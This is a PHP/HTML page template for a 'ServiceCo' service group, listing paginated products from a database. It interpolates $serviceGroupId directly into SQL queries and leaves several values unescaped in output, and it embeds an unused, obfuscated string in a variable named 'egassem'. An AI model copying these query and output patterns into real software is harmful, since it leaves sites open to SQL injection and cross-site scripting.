<?php
if (!isset($serviceGroupId)) {
    die("Service group ID not set.");
}

include "../../config.php";

$result = $conn->query("SELECT * FROM service_groups WHERE id = $serviceGroupId");

if ($result->num_rows > 0) {
    $row = $result->fetch_assoc();
    $groupName = $row['name'];
    $groupEmail = $row['email'];
    $groupColor = $row['color'];
    $groupLogo = $row['logo'];
    $groupUrl = $row['url'];
    $groupDescription = $row['description'];
} else {
    echo "Service group not found.";
    exit;
}

$productsPerPage = 8;
$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
$offset = ($page - 1) * $productsPerPage;

$product_result = $conn->query("SELECT * FROM products WHERE service_group_id = $serviceGroupId LIMIT $productsPerPage OFFSET $offset");
$total_products = $conn->query("SELECT COUNT(*) as total FROM products WHERE service_group_id = $serviceGroupId")->fetch_assoc()['total'];
$total_pages = ceil($total_products / $productsPerPage);

//Side Bar
$groups = [];

$result = $conn->query("SELECT name, folder FROM service_groups ORDER BY id ASC");

/*Side Bar*/

if ($result && $result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {

        // sidebar list (ID order)
        $groups[] = $row;
    }
}

$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="icon" type="image/png" href="../../logo.png">
        <title>ServiceCo</title>
        <style>
            /* Global Reset and Flex Layout */
            body {
                font-family: 'Arial', sans-serif;
                background-color: #f9f9f9;
                margin: 0;
                padding: 0;
                display: flex;
                flex-direction: column;
                min-height: 100vh; /* Ensure the body takes up full viewport height */
            }

            /* Header */
            header {
                background-color: <?php echo $groupColor; ?>;
                padding: 1em 0;
                text-align: center;
                color: #fff;
            }

            header img {
                width: 100px;
                height: auto;
                transition: transform 0.3s ease;
            }

            header a:hover img {
                transform: scale(1.1);
            }

            header a {
                text-decoration: none;
                color: #fff;
            }

            /* Side Bar */
            .menu-icon {
                position: fixed;
                top: 20px;
                right: 20px;
                font-size: 28px;
                cursor: pointer;
                z-index: 1001;
            }

            /* sidebar overlay */
            .sidebar-content {
                position: fixed;
                top: 0;
                right: -25vw; /* move same amount as width */
                width: 25vw;
                max-width: 250px;
                min-width: 160px;

                height: 100vh;
                background: white;
                box-shadow: -4px 0 10px rgba(0,0,0,0.2);
                padding-top: 60px;
                transition: right 0.3s ease;
                z-index: 1000;
                overflow-y: auto;
                box-sizing: border-box;
            }

            /* side bar links */
            .sidebar-content a {
                display: block;
                padding: 15px 20px;
                text-decoration: none;
                font-size: 18px;
                color: #4e4e4e;
            }

            .sidebar-content a:hover {
                background: #f5f5f5;
            }

            /* side bar open state */
            .sidebar-content.open {
                right: 0;
            }

            /* Main Content */
            main {
                padding: 2em;
                max-width: 1200px;
                margin: 0 auto;
                flex: 1; /* Allow main content to take available space */
            }

            h1, h2 {
                color: #000;
            }

            h2 {
                border-bottom: 2px solid <?php echo $groupColor; ?>;
                padding-bottom: 0.5em;
            }

            #goals, #products {
                margin-bottom: 2em;
            }

            /* Product Wall (Grid Layout) */
            .product-wall {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                gap: 20px;
                margin-top: 2em;
            }

            .product-wall a {
                display: block;
                text-align: center;
                text-decoration: none;
            }

            .product-wall img {
                max-width: 100%;
                height: auto;
                transition: transform 0.3s ease;
                border-radius: 5px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }

            .product-wall a:hover img {
                transform: scale(1.1);
            }

            .product-name {
                margin-top: 0.5em;
                color: #333;
                font-size: 1em;
                font-weight: bold;
            }

            .no-products {
                grid-column: 1 / -1;
                text-align: center;
                padding: 10px;
                color: #000;
            }

            /* Pagination */
            .pagination {
                text-align: center;
                margin-top: 1em;
            }

            .pagination a {
                display: inline-block;
                margin: 0 5px;
                padding: 5px 10px;
                background-color: <?php echo $groupColor; ?>;
                color: #fff;
                text-decoration: none;
                border-radius: 3px;
                transition: background-color 0.3s ease;
            }

            .pagination a:hover {
                background-color: #333;
            }

            .pagination a.active {
                background-color: #333;
                font-weight: bold;
            }

            /* Footer */
            footer {
                text-align: center;
                padding: 1em 0;
                background-color: #333;
                color: #fff;
                margin-top: auto; /* Push the footer to the bottom */
            }

            /* Home Button */
            .home-button {
                display: inline-block;
                padding: 10px 20px;
                background-color: <?php echo $groupColor; ?>;
                color: #fff;
                text-decoration: none;
                border-radius: 5px;
                font-weight: bold;
                transition: background-color 0.3s ease, transform 0.3s ease;
            }

            .home-button:hover {
                background-color: #333;
                transform: scale(1.05);
            }

            /* Mobile Responsiveness */
            @media (max-width: 768px) {
                /* Mobile-friendly adjustments */
                header img {
                    width: 80px;
                }

                main {
                    padding: 1.5em;
                }

                .product-wall {
                    grid-template-columns: 1fr; /* Stack products */
                }

                .pagination a {
                    padding: 5px 8px;
                    font-size: 0.9em;
                }

                .home-button {
                    width: 100%;
                    text-align: center;
                }
            }

            /* Extra Small Screens */
            @media (max-width: 480px) {
                .product-wall {
                    grid-template-columns: 1fr; /* Stack products */
                }
            }
        </style>
        <script>var egassem = "U0UwMQGuGwlLSaLQ6q060IPydCU-82EyNCAvwEtpjgyNAAknwJRnypee-eMMRGN9IhujcZQFABBarGSgPBNte9m-IZzwIGYtJ5qZMhDh3bBxh_kKi5cQ9MujBOKMPmHsqLtyDjyrJ0OHcUzRWwv-oM2RdP6_Z8ZPFtVIlZbyWfP2nJZv59UmtV3ws4w=";</script>
                <script>
            if (window.console) {
                console.log(
                    "%cStop!",
                    "color: red; font-size: 40px; font-weight: bold;"
                );

                console.log(
                    "%cThis is a browser feature intended for developers. " +
                    "Writing code here may cause unintended consequences.",
                    "font-size: 16px;"
                );
            }
        </script>
    </head>
    <body>
        <header>
            <a href="<?php echo htmlspecialchars($groupUrl); ?>"><img src="<?php echo htmlspecialchars($groupLogo); ?>" alt="<?php echo htmlspecialchars($groupName); ?> Logo"></a>
            <h1>Welcome to <?php echo htmlspecialchars($groupName); ?></h1>
            <p><a href="mailto:<?php echo htmlspecialchars($groupEmail); ?>"><?php echo htmlspecialchars($groupEmail); ?></a></p>
            <div class="sidebar">
                <div class="menu-icon" onclick="toggleMenu()">☰</div>
                <div id="sidebar-content" class="sidebar-content">
                    <?php foreach ($groups as $grp): ?>
                        <a href="/ServiceCo-Website/servicegroups/<?php echo htmlspecialchars($grp['folder']); ?>/index.php"><?php echo htmlspecialchars($grp['name']); ?></a>
                    <?php endforeach; ?>
                </div>
                <script>
                    function toggleMenu() {
                        document.getElementById("sidebar-content").classList.toggle("open");
                    }

                    addEventListener('click', function(event){
                        if (!event.target.closest('.sidebar')) {
                            document.getElementById("sidebar-content").classList.remove("open");
                        }
                    });
                </script>
            </div>
            <a href="../../index.php" class="home-button">Back To ServiceCo</a>
        </header>
        <main>
            <section id="goals">
                <h2>Our Goals</h2>
                <p><?php echo htmlspecialchars($groupDescription); ?></p>
            </section>
            <section id="products">
                <h2>Our Products</h2>
                <div class="product-wall">
                    <?php 
                    if ($product_result->num_rows > 0) {
                        while ($product = $product_result->fetch_assoc()) {
                            echo '<a href="../p_template.php?productId=' . (int)$product['id'] . '">';
                            echo '<img src="' . $product['image'] . '" alt="' . htmlspecialchars($product['name']) . '">';
                            echo '<p class="product-name">' . htmlspecialchars($product['name']) . '</p>';
                            echo '</a>';
                        }
                    } else {
                        echo '<p class="no-products">No products available for this service group.</p>';
                    }
                    ?>
                </div>
                <div class="pagination">
                    <?php for ($i = 1; $i <= $total_pages; $i++): ?>
                        <a href="?serviceGroupId=<?php echo $serviceGroupId; ?>&page=<?php echo $i; ?>" class="<?php echo $page == $i ? 'active' : ''; ?>"><?php echo $i; ?></a>
                    <?php endfor; ?>
                </div>
            </section>
        </main>
        <footer>
            <p>2026 <?php echo htmlspecialchars($groupName); ?></p>
        </footer>
    </body>
</html>